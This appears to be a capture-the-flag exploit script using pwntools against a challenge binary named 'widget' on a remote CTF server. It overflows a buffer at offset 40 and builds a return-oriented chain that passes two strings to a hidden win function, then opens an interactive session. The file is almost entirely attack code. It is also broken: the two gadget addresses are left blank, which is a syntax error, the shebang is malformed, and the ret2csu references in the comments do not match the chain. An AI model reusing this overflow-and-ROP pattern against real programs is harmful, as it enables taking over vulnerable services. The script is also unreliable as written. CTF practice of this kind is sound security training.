#!user/bin/python3
from pwn import *

# ret2csu references
# https://gist.github.com/kaftejiman/a853ccb659fc3633aa1e61a9e26266e9
# https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html
# https://bananamafia.dev/post/x64-rop-redpwn/
# https://www.youtube.com/watch?v=xOHLniVJsJY

# =========================================================
#                          SETUP                         
# =========================================================
io = remote('challs.actf.co', 31320)
exe = './widget'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'


# =========================================================
#                         EXPLOITS
# =========================================================

# Got manually through cyclic gdb-pwndbg
offset = 40

# Got manually through ropper
pop_rdi = 
pop_rsi_15 = 

# Got manually through RE on ghidra
win_address = 0x4012f8
param_1 =  "14571414c5d9fe9ed0698ef21065d8a6"
param_2 = "willy_wonka_widget_factory"

# padding + pop_rdi + param_1 + pop_rsi_15 + param_2 + junk + win()
payload = flat({
    offset: [
        pop_rdi,
        param_1,
        pop_rsi_15,
        param_2,
        0x0,
        win_address
    ]
})

io.sendlineafter(b'Your input: ', payload)

io.interactive()
